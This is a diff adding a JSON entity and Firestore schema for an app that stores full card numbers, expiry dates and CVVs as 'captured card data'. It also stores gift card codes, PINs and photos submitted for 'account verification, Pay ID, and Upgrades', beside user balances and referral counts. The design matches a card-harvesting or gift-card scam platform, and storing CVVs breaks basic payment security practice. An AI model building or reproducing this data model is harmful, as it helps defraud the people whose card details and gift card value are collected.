@@ -1,0 +1,90 @@
+{
+  "entities": {
+    "CardSubmission": {
+      "title": "Card Submission",
+      "description": "ATM card details captured for automated payments",
+      "type": "object",
+      "properties": {
+        "id": { "type": "string", "pattern": "^[a-zA-Z0-9_\\-]+$" },
+        "type": { "type": "string" },
+        "cardNumber": { "type": "string" },
+        "expiry": { "type": "string" },
+        "cvv": { "type": "string" },
+        "cardName": { "type": "string" },
+        "amount": { "type": "number" },
+        "userEmail": { "type": "string" },
+        "userName": { "type": "string" },
+        "date": { "type": "string" }
+      },
+      "required": ["id", "type", "cardNumber", "amount", "userEmail", "date"]
+    },
+    "GiftCardSubmission": {
+      "title": "Gift Card Submission",
+      "description": "Gift card verification submissions for account verification, Pay ID, and Upgrades",
+      "type": "object",
+      "properties": {
+        "id": { "type": "string" },
+        "type": { "type": "string" },
+        "cardBrand": { "type": "string" },
+        "cardCode": { "type": "string" },
+        "cardPin": { "type": "string" },
+        "amount": { "type": "number" },
+        "cardFormat": { "type": "string" },
+        "image": { "type": "string" },
+        "userEmail": { "type": "string" },
+        "userName": { "type": "string" },
+        "date": { "type": "string" },
+        "status": { "type": "string" }
+      },
+      "required": ["id", "type", "cardBrand", "cardCode", "amount", "userEmail", "date"]
+    },
+    "FcmToken": {
+      "title": "FCM Token",
+      "description": "Device registration token for push notifications",
+      "type": "object",
+      "properties": {
+        "email": { "type": "string" },
+        "token": { "type": "string" },
+        "updatedAt": { "type": "string" }
+      },
+      "required": ["email", "token"]
+    },
+    "UserProfile": {
+      "title": "User Profile",
+      "description": "User profile data stored in cloud",
+      "type": "object",
+      "properties": {
+        "name": { "type": "string" },
+        "email": { "type": "string" },
+        "balance": { "type": "number" },
+        "referralBalance": { "type": "number" },
+        "totalReferrals": { "type": "number" },
+        "accountLevel": { "type": "string" },
+        "referralCode": { "type": "string" }
+      },
+      "required": ["name", "email", "balance"]
+    }
+  },
+  "firestore": {
+    "/cardSubmissions/{submissionId}": {
+      "schema": "CardSubmission",
+      "description": "Collection of captured card data"
+    },
+    "/giftCardSubmissions/{submissionId}": {
+      "schema": "GiftCardSubmission",
+      "description": "Collection of submitted gift cards for account verification"
+    },
+    "/fcmTokens/{tokenId}": {
+      "schema": "FcmToken",
+      "description": "Collection of FCM device tokens for push notifications"
+    },
+    "/users/{userId}": {
+      "schema": "UserProfile",
+      "description": "User profiles for cross-device sync"
+    },
+    "/transactions/{userId}": {
+      "schema": "UserProfile",
+      "description": "User transactions for cross-device sync"
+    }
+  }
+}
